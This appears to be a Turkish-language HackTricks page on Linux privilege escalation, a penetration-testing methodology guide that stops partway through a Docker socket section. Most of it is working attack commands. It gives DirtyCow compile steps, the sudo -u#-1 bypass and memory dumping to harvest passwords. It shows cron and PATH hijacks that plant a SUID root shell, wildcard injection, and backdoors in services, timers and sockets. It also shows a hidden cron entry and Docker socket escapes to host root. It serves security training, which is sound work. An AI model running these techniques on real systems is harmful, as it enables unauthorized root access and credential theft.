# Linux Yetki Yükseltme

<details>

<summary><strong>Sıfırdan kahraman olmaya kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünleri**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi**](https://opensea.io/collection/the-peass-family)'ni keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına.

</details>

## Sistem Bilgileri

### İşletim Sistemi Bilgileri

Çalışan işletim sistemi hakkında bilgi edinmeye başlayalım.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Yol

Eğer `PATH` değişkeni içindeki herhangi bir klasörde **yazma izniniz varsa**, bazı kütüphaneleri veya ikili dosyaları ele geçirebilirsiniz:
```bash
echo $PATH
```
### Çevre bilgisi

Çevre değişkenlerinde ilginç bilgiler, şifreler veya API anahtarları var mı?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel sürümünü kontrol edin ve ayrıcalıkları yükseltmek için kullanılabilecek bir exploit olup olmadığını kontrol edin.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
İyi bir zayıf çekirdek listesi ve bazı zaten derlenmiş **saldırılar** burada bulunabilir: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Bazı **derlenmiş saldırıları** bulabileceğiniz diğer siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

O web sitesinden tüm zayıf çekirdek sürümlerini çıkarmak için:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploits aramak için yardımcı olabilecek araçlar:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (kurban üzerinde çalıştırılmalı, yalnızca kernel 2.x için exploitleri kontrol eder)

Her zaman **Google'da kernel sürümünü arayın**, belki kernel sürümünüz bazı kernel exploitlerinde yazılıdır ve bu sayede bu exploitin geçerli olduğundan emin olabilirsiniz.

### CVE-2016-5195 (DirtyCow)

Linux Yetki Yükseltme - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo sürümü

Vulnerabl sudo sürümlerine dayanarak:
```bash
searchsploit sudo
```
Sudo sürümünün zayıf olup olmadığını bu grep kullanarak kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

@sickrov tarafından
```
sudo -u#-1 /bin/bash
```
### Dmesg imza doğrulaması başarısız oldu

Bu zafiyetin nasıl sömürülebileceğine dair bir örnek için **HTB'nin smasher2 kutusuna** bakın.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla sistem tespiti
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunmaları sırala

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurity, Linux çekirdeğine eklenen bir dizi güvenlik yamasıdır. Bu yamalar, çeşitli güvenlik önlemleri sağlayarak Linux sistemlerini daha güvenli hale getirir. Grsecurity, özellikle yetki yükseltme saldırılarına karşı ek koruma sağlar.
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

Execshield, Red Hat tarafından geliştirilen bir güvenlik önlemidir. Bu önlem, bellek bölgelerini korumak için kullanılır ve kötü niyetli yazılımların saldırılarını engellemeye yardımcı olur. Execshield, yürütülebilir bellek bölgelerini koruyarak kötü niyetli saldırılara karşı ek bir güvenlik katmanı sağlar.
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

**SELinux** (Security-Enhanced Linux), GNU GPL lisansı altında sunulan bir güvenlik modülüdür. **SELinux**, Linux çekirdeğine entegre edilmiş bir güvenlik mekanizmasıdır. **SELinux**, Linux işletim sisteminde zayıf yapılandırılmış uygulamaların ve hizmetlerin neden olduğu güvenlik açıklarını kapatmaya yardımcı olur.
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

ASLR (Adres Alanı Rastgele Konumlandırma), saldırganların hedef sistemdeki bellek bölgelerini tahmin etmesini zorlaştıran bir güvenlik önlemidir. ASLR etkinleştirildiğinde, sistem rastgele bellek adresleri kullanarak uygulama, kütüphane ve işletim sistemi bileşenlerini yükler. Bu, saldırganların hedef sistemdeki bellek bölgelerini tahmin etmesini zorlaştırarak sıfır gün saldırılarını önler.
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Kaçışı

Eğer bir docker konteynerinin içindeyseniz, ondan kaçmaya çalışabilirsiniz:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Sürücüler

**Nelerin bağlandığını ve bağlanmadığını**, nerede ve neden kontrol edin. Eğer bir şey bağlanmamışsa, onu bağlamayı deneyebilir ve özel bilgileri kontrol edebilirsiniz.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Kullanışlı yazılımlar

Yararlı ikili dosyaları sıralayın
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca, **herhangi bir derleyicinin yüklü olup olmadığını kontrol edin**. Bu, bazı kernel açıklarını kullanmanız gerektiğinde faydalıdır çünkü derlemeyi kullanacağınız makinede (veya benzer bir makinede) derlemeniz önerilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Yüklü Güvenlik Açıklı Yazılımlar

Yüklü paketlerin ve hizmetlerin sürümünü kontrol edin. Belki de ayrıcalıkları yükseltmek için sömürülebilecek eski bir Nagios sürümü gibi bir yazılım bulunabilir... Daha şüpheli yüklü yazılımların sürümünü manuel olarak kontrol etmeniz önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Eğer makineye SSH erişiminiz varsa, makine içinde yüklü olan eski ve savunmasız yazılımları kontrol etmek için **openVAS**'ı da kullanabilirsiniz.

{% hint style="info" %}
_Bu komutlar genellikle gereksiz bilgileri gösterecektir, bu nedenle yüklü yazılım sürümünün bilinen saldırılara karşı savunmasız olup olmadığını kontrol edecek OpenVAS veya benzeri uygulamalar önerilir_
{% endhint %}

## İşlemler

**Hangi işlemlerin** yürütüldüğüne bakın ve herhangi bir işlemin **olması gerekenden daha fazla ayrıcalığa sahip olup olmadığını** kontrol edin (belki de root tarafından yürütülen bir tomcat olabilir mi?)
```bash
ps aux
ps -ef
top -n 1
```
Her zaman çalışan olası **electron/cef/chromium hata ayıklayıcılarını** kontrol edin, ayrıcalıkları yükseltmek için bunu istismar edebilirsiniz. **Linpeas**, sürecin komut satırında `--inspect` parametresini kontrol ederek bunları tespit eder.\
Ayrıca **süreç dosyaları üzerindeki ayrıcalıklarınızı kontrol edin**, belki birinin üzerine yazabilirsiniz.

### Süreç izleme

[**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları kullanarak süreçleri izleyebilirsiniz. Bu, sık sık yürütülen zayıf süreçleri veya belirli gereksinimlerin karşılandığı durumları tespit etmek için çok yararlı olabilir.

### Süreç belleği

Bir sunucunun bazı hizmetleri **kimlik bilgilerini açık metin olarak belleğin içine kaydeder**.\
Genellikle diğer kullanıcılara ait süreçlerin belleğini okumak için **kök ayrıcalıklarına** ihtiyacınız olacaktır, bu nedenle bu genellikle zaten kök kullanıcıysanız ve daha fazla kimlik bilgisi keşfetmek istiyorsanız daha yararlı olacaktır.\
Ancak, **normal bir kullanıcı olarak kendi süreçlerinizin belleğini okuyabilirsiniz**.

{% hint style="warning" %}
Günümüzde çoğu makine **varsayılan olarak ptrace izin vermez** bu da demektir ki ayrıcalıksız kullanıcınıza ait diğer süreçleri dökemezsiniz.

_**/proc/sys/kernel/yama/ptrace\_scope**_ dosyası ptrace'nin erişilebilirliğini kontrol eder:

* **kernel.yama.ptrace\_scope = 0**: aynı uid'ye sahip tüm süreçler hata ayıklayabilir. Bu, ptracing'in klasik çalışma şeklidir.
* **kernel.yama.ptrace\_scope = 1**: yalnızca bir üst süreç hata ayıklayabilir.
* **kernel.yama.ptrace\_scope = 2**: Yalnızca yönetici ptrace kullanabilir, çünkü CAP\_SYS\_PTRACE yetkisine ihtiyaç duyar.
* **kernel.yama.ptrace\_scope = 3**: Hiçbir süreç ptrace ile izlenemez. Bir kez ayarlandığında, ptracing'i yeniden etkinleştirmek için bir yeniden başlatma gereklidir.
{% endhint %}

#### GDB

Örneğin bir FTP hizmetinin belleğine erişiminiz varsa, Heap'i alabilir ve kimlik bilgilerini içinde arayabilirsiniz.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Betiği

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps ve /proc/$pid/mem

Verilen bir işlem kimliği için **haritalar, o işlemin** sanal adres alanı içinde nasıl belleğe **haritalandığını gösterir; ayrıca her haritalanmış bölgenin izinlerini** gösterir. **Mem** yalancı dosyası **işlemin belleğini kendisi açığa çıkarır**. **Haritalar** dosyasından hangi **bellek bölgelerinin okunabilir olduğunu ve ofsetlerini** bildiğimizde, bu bilgileri kullanarak **mem dosyasına gidip tüm okunabilir bölgeleri bir dosyaya dökeriz**.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem`, sistem **fiziksel** belleğine erişim sağlar, sanal belleği değil. Çekirdeğin sanal adres alanına /dev/kmem kullanılarak erişilebilir.\
Genellikle, `/dev/mem` yalnızca **root** ve **kmem** grupları tarafından okunabilir.
```
strings /dev/mem -n10 | grep -i PASS
```
### Linux için ProcDump

ProcDump, Windows için Sysinternals araç takımından klasik ProcDump aracının Linux için yeniden hayal edilmiş halidir. [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) adresinden edinebilirsiniz.
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Araçlar

Bir işlem belleğini dökmek için şunları kullanabilirsiniz:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Kök gereksinimlerini manuel olarak kaldırabilir ve size ait olan işlemi dökebilirsiniz
* [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) adresindeki Script A.5 (root gereklidir)

### İşlem Belleğinden Kimlik Bilgileri

#### Manuel örnek

Eğer doğrulayıcı işlemin çalıştığını bulursanız:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Prosesi dökümleyebilirsiniz (farklı yöntemleri bulmak için önceki bölümlere bakın) ve bellek içinde kimlik bilgilerini arayabilirsiniz:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Araç [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin), bellekten **açık metin kimlik bilgilerini** ve bazı **tanınmış dosyalardan** çalar. Doğru çalışabilmesi için kök ayrıcalıklarına ihtiyaç duyar.

| Özellik                                           | İşlem Adı            |
| ------------------------------------------------- | -------------------- |
| GDM şifresi (Kali Masaüstü, Debian Masaüstü)      | gdm-password         |
| Gnome Keyring (Ubuntu Masaüstü, ArchLinux Masaüstü)| gnome-keyring-daemon |
| LightDM (Ubuntu Masaüstü)                         | lightdm              |
| VSFTPd (Aktif FTP Bağlantıları)                   | vsftpd               |
| Apache2 (Aktif HTTP Temel Kimlik Doğrulama Oturumları)| apache2           |
| OpenSSH (Aktif SSH Oturumları - Sudo Kullanımı)   | sshd:                |

#### Arama Regexler/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zamanlanmış/Cron işleri

Kontrol edin eğer herhangi bir zamanlanmış işlem savunmasız ise. Belki de root tarafından yürütülen bir betikten faydalanabilirsiniz (joker açığı mı? root'un kullandığı dosyaları değiştirebilir mi? semboller kullanabilir mi? root'un kullandığı dizinde belirli dosyalar oluşturabilir mi?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron yolu

Örneğin, _/etc/crontab_ dosyası içinde _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_ yolu bulabilirsiniz.

(_"user" kullanıcısının /home/user üzerinde yazma izinlerine sahip olduğuna dikkat edin_)

Bu crontab dosyası içinde root kullanıcısı bir komut veya betik çalıştırmaya çalışırken yol belirtmeden denemesi durumunda. Örneğin: _\* \* \* \* root overwrite.sh_\
O zaman, bir root kabuğu elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Bir Script Kullanarak Cron ile Jokere Sahip Olma (Joker Enjeksiyonu)

Eğer bir kök kullanıcı tarafından çalıştırılan bir betikte bir komutun içinde "**\***" varsa, bunu beklenmedik şeyler yapmak için (örneğin ayrıcalık yükseltme) kullanabilirsiniz. Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Eğer joker karakteri bir yolun önünde gelirse** _**/bazı/yol/\***_ **şeklinde, bu zayıf değildir (hatta** _**./\***_ **değil).**

Daha fazla joker karakteri sömürüsü hilesi için aşağıdaki sayfayı okuyun:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Cron betiği üzerine yazma ve sembolik bağlantı

Eğer **kök tarafından yürütülen bir cron betiğini değiştirebiliyorsanız**, çok kolay bir şekilde bir kabuk alabilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Eğer root tarafından yürütülen betik, **tam erişiminiz olan bir dizini kullanıyorsa**, belki o klasörü silip yerine sizin kontrol ettiğiniz bir betiği hizmet eden başka bir dizine **sembolik bağlantı oluşturmak** faydalı olabilir.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Sık kullanılan cron işleri

Her 1, 2 veya 5 dakikada bir çalıştırılan işlemleri aramak için süreçleri izleyebilirsiniz. Belki bundan faydalanarak ayrıcalıkları yükseltebilirsiniz.

Örneğin, **her 1 dakika boyunca her 0.1 saniyede izlemek** için, **daha az çalıştırılan komutlara göre sıralamak** ve en çok çalıştırılan komutları silmek için şunu yapabilirsiniz:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ayrıca** [**pspy**](https://github.com/DominicBreuker/pspy/releases) **kullanabilirsiniz** (bu, başlatılan her işlemi izleyip listeleyecektir).

### Görünmez cron işleri

Bir cron işi oluşturmak mümkündür **bir yorumun ardından bir satır sonu karakteri oluşturarak** (newline karakteri olmadan), ve cron işi çalışacaktır. Örnek (satır sonu karakterine dikkat edin):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Hizmetler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyasını yazabilir miyim diye kontrol edin, eğer yapabilirseniz, **onu değiştirebilirsiniz** böylece hizmet **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** sizin **arka kapınızı çalıştırabilir** (belki makinenin yeniden başlatılmasını beklemeniz gerekebilir).\
Örneğin, arka kapınızı .service dosyasının içine **`ExecStart=/tmp/script.sh`** olarak oluşturun.

### Yazılabilir hizmet ikili dosyaları

Hizmetler tarafından **çalıştırılan ikili dosyalara yazma izniniz varsa**, onları arka kapılar için değiştirebilirsiniz, böylece hizmetler yeniden çalıştırıldığında arka kapılar çalıştırılacaktır.

### systemd PATH - Göreceli Yollar

**systemd** tarafından kullanılan PATH'ı görebilirsiniz:
```bash
systemctl show-environment
```
Eğer yolun herhangi bir klasörüne **yazma** izniniz olduğunu fark ederseniz, **yetkileri yükseltebilir**siniz. Servis yapılandırma dosyalarında kullanılan **göreceli yolları** aramanız gerekebilir:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Sonra, **yürütülebilir** bir dosya oluşturun ve yazabileceğiniz systemd PATH klasöründeki **göreceli yol ikili dosyasıyla aynı ada sahip** olacak şekilde, servisin **Başlat, Durdur, Yeniden Yükle** gibi zafiyetli eylemi gerçekleştirmesi istendiğinde, **arka kapınız çalıştırılacak** (genellikle yetkisiz kullanıcılar servisleri başlatamaz/durduramaz ancak `sudo -l` komutunu kullanıp kullanamadığınızı kontrol edin).

**Servisler hakkında daha fazla bilgi edinin: `man systemd.service`.**

## **Zamanlayıcılar**

**Zamanlayıcılar**, adı `**.timer**` ile biten systemd birim dosyalarıdır ve `**.service**` dosyalarını veya olayları kontrol eder. **Zamanlayıcılar**, takvim zaman olayları ve monotonik zaman olayları için yerleşik destek sağladıkları için cron'un alternatifi olarak kullanılabilir ve asenkron olarak çalıştırılabilirler.

Tüm zamanlayıcıları şu şekilde sıralayabilirsiniz:
```bash
systemctl list-timers --all
```
### Yazılabilir zamanlayıcılar

Bir zamanlayıcıyı değiştirebiliyorsanız, onu bir `.service` veya `.target` gibi systemd.unit'in mevcut olanlarını çalıştırmak için kullanabilirsiniz.
```bash
Unit=backdoor.service
```
Belgede, Ünite'nin ne olduğunu okuyabilirsiniz:

> Bu zamanlayıcı süresi dolduğunda etkinleştirilecek birim. Argüman, ".timer" olmayan bir birim adıdır. Belirtilmezse, bu değer zamanlayıcı biriminin adı hariç aynı ada sahip bir hizmete varsayılan olarak ayarlanır. (Yukarıya bakınız.) Etkinleştirilen birim adının ve zamanlayıcı biriminin birim adının, sonek hariç olmak üzere aynı şekilde adlandırılması önerilir.

Bu izni kötüye kullanmak için şunlara ihtiyacınız olacaktır:

* **Yazılabilir bir ikili dosya yürüten** bir systemd birimi (örneğin `.service`) bulun
* **Göreceli bir yol yürüten** ve **systemd PATH** üzerinde **yazma izinleriniz** olan bir systemd birimi bulun (bu yürütülebilir dosyayı taklit etmek için)

**Zamanlayıcılar hakkında daha fazla bilgi için `man systemd.timer` komutunu kullanın.**

### **Zamanlayıcıyı Etkinleştirme**

Bir zamanlayıcıyı etkinleştirmek için kök ayrıcalıklarına ihtiyacınız vardır ve şunu yürütmeniz gerekir:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Not **:timer:** oluşturarak **etkinleştirilir** `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` üzerine bir sembolik bağ oluşturarak.

## Soketler

Unix Domain Sockets (UDS), istemci-sunucu modelleri içinde aynı veya farklı makinelerde **işlem iletişimini** sağlar. İnter-bilgisayar iletişimi için standart Unix tanımlayıcı dosyalarını kullanır ve `.socket` dosyaları aracılığıyla kurulur.

Soketler, `.socket` dosyaları kullanılarak yapılandırılabilir.

**Soketler hakkında daha fazla bilgi edinin `man systemd.socket`.** Bu dosya içinde birkaç ilginç parametre yapılandırılabilir:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır ancak bir özet, sokete nerede dinleyeceğini belirtmek için kullanılır (AF\_UNIX soket dosyasının yolu, dinlemek için IPv4/6 ve/veya port numarası vb.).
* `Accept`: Bir boolean argüman alır. **true** ise, her gelen bağlantı için bir **hizmet örneği başlatılır** ve yalnızca bağlantı soketi ona iletilir. **false** ise, tüm dinleme soketleri kendileri **başlatılan hizmet birimine iletilir** ve tüm bağlantılar için yalnızca bir hizmet birimi başlatılır. Bu değer, tek bir hizmet biriminin tüm gelen trafiği koşulsuz olarak ele aldığı datagram soketleri ve FIFO'lar için yoksayılır. **Varsayılan olarak false**. Performans nedeniyle, yeni daemon'ların yalnızca `Accept=no` için uygun bir şekilde yazılması önerilir.
* `ExecStartPre`, `ExecStartPost`: Bir veya daha fazla komut satırı alır, bunlar dinleme **soketleri**/FIFO'lar **oluşturulmadan önce** veya **sonra** **yürütülür** ve bağlanır. Komut satırının ilk belirteci mutlaka mutlak bir dosya adı olmalı, ardından işlem için argümanlar gelmelidir.
* `ExecStopPre`, `ExecStopPost`: Dinleme **soketleri**/FIFO'lar **kapatılmadan önce** veya **sonra** kaldırılan ek **komutlar**.
* `Service`: Gelen trafiği **etkinleştirmek için hizmet** birimi adını belirtir. Bu ayar yalnızca Accept=no olan soketler için izin verilir. Varsayılan olarak, aynı adı taşıyan hizmet birimi (soneki değiştirilmiş) ile aynı adı taşıyan soket için geçerlidir. Çoğu durumda, bu seçeneği kullanmanın gerekli olmaması gerekmektedir.

### Yazılabilir .socket dosyaları

Eğer **yazılabilir** bir `.socket` dosyası bulursanız, `[Socket]` bölümünün başına şöyle bir şey ekleyebilirsiniz: `ExecStartPre=/home/kali/sys/backdoor` ve arka kapı soket oluşturulmadan önce yürütülecektir. Bu nedenle, muhtemelen makinenin yeniden başlatılmasını **beklemeniz gerekebilir.**\
_Not: Sistem, o soket dosyası yapılandırmasını kullanıyor olmalı veya arka kapı yürütülmeyecektir_

### Yazılabilir soketler

Eğer **herhangi bir yazılabilir soket** belirlerseniz (_şu anda Unix Soketleri hakkında konuşuyoruz ve `.socket` yapılandırma dosyaları hakkında değil_), o soketle **iletişim kurabilir** ve belki bir güvenlik açığından yararlanabilirsiniz.

### Unix Soketlerini Sırala
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Sömürü örneği:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP soketleri

Unutmayın ki bazı **HTTP isteklerini dinleyen soketler** olabilir (_Ben .socket dosyalarından bahsetmiyorum, ancak unix soketleri olarak hareket eden dosyalardan bahsediyorum_). Bunun kontrolünü şu şekilde yapabilirsiniz:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Eğer soket **bir HTTP** isteği ile yanıt verirse, o zaman onunla **iletişim** kurabilir ve belki de bazı zafiyetleri **sömürebilirsiniz**.

### Yazılabilir Docker Soketi

Genellikle `/var/run/docker.sock` konumunda bulunan Docker soketi, güvenli olması gereken kritik bir dosyadır. Varsayılan olarak, bu soket `root` kullanıcısı ve `docker` grubundaki üyeler tarafından yazılabilir durumdadır. Bu sokete yazma erişiminin olması, ayrıcalık yükseltmesine yol açabilir. Bunun nasıl yapılabileceği ve Docker CLI kullanılamıyorsa alternatif yöntemler aşağıda açıklanmıştır.

#### **Docker CLI ile Ayrıcalık Yükseltme**

Eğer Docker soketine yazma erişiminiz varsa, aşağıdaki komutları kullanarak ayrıcalıkları yükseltebilirsiniz:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Bu komutlar, ana bilgisayar dosya sisteminin kök düzey erişimine sahip bir konteyneri çalıştırmanıza olanak tanır.

#### **Docker API'sini Doğrudan Kullanma**

Docker CLI kullanılamadığında Docker API ve `curl` komutları kullanılarak Docker soketi manipüle edilebilir.

1.  **Docker Görüntülerini Listeleme:** Mevcut görüntülerin listesini alın.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```
2.  **Bir Konteyner Oluşturma:** Ana sistem kök dizinini bağlayan bir konteyner oluşturmak için bir istek gönderin.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Yeni oluşturulan konteyneri başlatın:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
3.  **Konteynere Bağlanma:** `socat` kullanarak konteynere bağlantı kurun ve içinde komut yürütme imkanı sağlayın.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
